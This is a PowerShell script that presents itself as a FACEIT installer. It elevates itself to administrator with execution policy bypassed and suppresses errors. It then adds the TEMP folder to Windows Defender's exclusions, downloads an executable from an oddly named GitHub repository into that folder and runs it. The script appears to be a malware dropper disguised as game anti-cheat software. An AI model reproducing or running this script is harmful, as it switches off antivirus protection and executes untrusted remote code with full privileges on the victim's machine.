$IsAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $IsAdmin) {
    Write-Host "Restart with Administrator..."
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$ErrorActionPreference = "SilentlyContinue"

try {
    Add-MpPreference -ExclusionPath $env:TEMP
} catch {}

$url = "https://github.com/thea-tetlo/sghdfhfsdsdhf/releases/download/AC/FACEITInstaller_64.exe?inline=false"
$outPath = "$env:TEMP\FACEIT_Installer64.exe"

Start-BitsTransfer -Source $url -Destination $outPath -DisplayName "Downloading..." -Description "Please wait"

if (Test-Path $outPath) {
    Write-Host "Starting..."
    Start-Process $outPath
} else {
    Write-Host "Failed"
}
